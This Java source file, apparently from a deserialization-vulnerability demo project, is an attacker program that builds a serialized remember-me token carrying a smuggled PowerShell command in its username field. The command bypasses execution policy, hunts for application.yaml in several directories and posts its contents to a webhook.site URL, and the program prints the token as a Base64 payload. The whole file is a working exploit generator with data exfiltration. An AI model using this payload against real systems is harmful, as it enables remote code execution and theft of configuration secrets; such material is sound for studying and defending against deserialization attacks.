package com.project01.javadeserialization;

import com.project01.javadeserialization.dto.VulnerableRememberMeToken;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import java.io.*;
import java.util.Base64;

@SpringBootApplication
public class AttackerApplication {

    public static void main(String[] args) {

        try {
            VulnerableRememberMeToken payload = new VulnerableRememberMeToken();

            String webhook = "https://webhook.site/9c5249d4-f066-4a34-beee-e49f5b4b4eab";

            String command = "powershell -NoProfile -ExecutionPolicy Bypass -c \"" +
                    "$file='application.yaml'; " +
                    "$paths=@('.','src/main/resources','../src/main/resources','config'); " +
                    "foreach($p in $paths){" +
                    "  $full=Join-Path $p $file; " +
                    "  if(Test-Path $full){" +
                    "    $content=Get-Content -Path $full -Raw; break;" +
                    "  }" +
                    "}; " +
                    "if(-not $content){$content='File not found'}; " +
                    "irm -Uri '" + webhook + "' -Method POST -Body $content -ContentType 'text/plain'\"";

            payload.setUsername(command);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(payload);
            oos.close();

            String base64Payload = Base64.getEncoder().encodeToString(baos.toByteArray());
            System.out.println(base64Payload);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
